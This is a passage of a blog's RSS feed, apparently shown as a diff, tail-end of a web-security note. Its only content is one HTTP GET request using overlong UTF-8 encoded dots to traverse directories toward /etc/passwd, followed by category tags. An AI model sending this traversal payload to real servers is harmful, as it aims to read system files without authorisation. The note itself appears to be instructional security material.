class="code"><pre><span class="line">GET /%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passw</span><br></pre></td></tr></table></figure>]]></content:encoded>
-      
-      
-      <category domain="https://hejueyun.github.io/categories/Security/">Security</category>
-      
-      <category domain="https://hejueyun.github.io/categories/Security/Web-Security/">Web Security</category>
-      
-      <category domain="https://hejueyun.github.io/categories/Security/Web-Security/Note/">Note</category>
-      
-      
-      <category domain="https://hejueyun.github.io/tags/sec/">sec</category>
-      
-      
-      <comments>https://hejueyun.github.io/posts/f11654a/#disqus_thread</comments>
       
     </item>
     
